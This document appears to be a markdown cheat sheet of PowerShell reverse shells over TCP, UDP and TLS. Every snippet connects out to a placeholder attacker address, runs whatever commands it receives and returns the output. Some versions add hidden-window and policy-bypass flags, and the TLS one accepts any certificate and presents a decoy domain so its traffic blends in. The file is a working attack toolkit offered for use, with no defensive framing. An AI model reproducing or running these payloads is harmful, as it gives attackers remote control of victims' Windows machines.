# PowerShell

## 01 - TCP Protocol

Verbosed one-liner.

```powershell
C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('<attacker_IP>', <attacker_PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (Invoke-Expression $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '; $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()"
```

```powershell
$LHOST = '<attacker_ip>'; $LPORT = <attacker_PORT>; $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object System.IO.StreamReader($NetworkStream); $StreamWriter = New-Object System.IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([System.Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write('$Output`n'); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

## 02 - UDP Protocol

One-liner UDP reverse shell.

```powershell
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("<attacker_IP>"), <attacker_PORT>);$client = New-Object System.Net.Sockets.UDPClient(53);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([System.Text.Encoding]::ASCII).GetBytes('PS> ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([System.Text.Encoding]::ASCII).GetString($receivebytes);$sendback = (Invoke-Expression $returndata 2>&1 | Out-String );$sendbytes = ([System.Text.Encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()
```

## 03 - TLS Protocol

```powershell
# Create a TCP connection to the specified IP and port
$socket = New-Object Net.Sockets.TcpClient('<IP>', <PORT>)
$stream = $socket.GetStream()

# Establish an SSL stream with a fake domain for authentication bypass
$sslStream = New-Object System.Net.Security.SslStream(
    $stream, 
    $false, 
    { $True -as [Net.Security.RemoteCertificateValidationCallback] }
)
$sslStream.AuthenticateAsClient('cloudflare-dns.com', $null, "Tls12", $false)

# Create a StreamWriter for sending data
$writer = New-Object System.IO.StreamWriter($sslStream)

# Write the initial prompt
$writer.Write('PS ' + (Get-Location).Path + '> ')
$writer.Flush()

# Buffer to store received data
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

# Read and process data in a loop
while (($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert bytes to string
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute the received command and capture output
    $sendback = (Invoke-Expression $data | Out-String) 2>&1
    
    # Append the current PowerShell path to the output
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    
    # Convert the response to bytes
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)
    
    # Write the response back to the SSL stream
    $sslStream.Write($sendbyte, 0, $sendbyte.Length)
    $sslStream.Flush()
}
```

One-liner.

```powershell
PS C:\> $socket = New-Object Net.Sockets.TcpClient('<IP>', <PORT>); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream, $false, ( {$True} -as [Net.Security.RemoteCertificateValidationCallback])) ;$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false); $writer = New-Object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (Invoke-Expression $data | Out-String) 2>&1; $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '; $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte, 0, $sendbyte.Length); $sslStream.Flush() }
```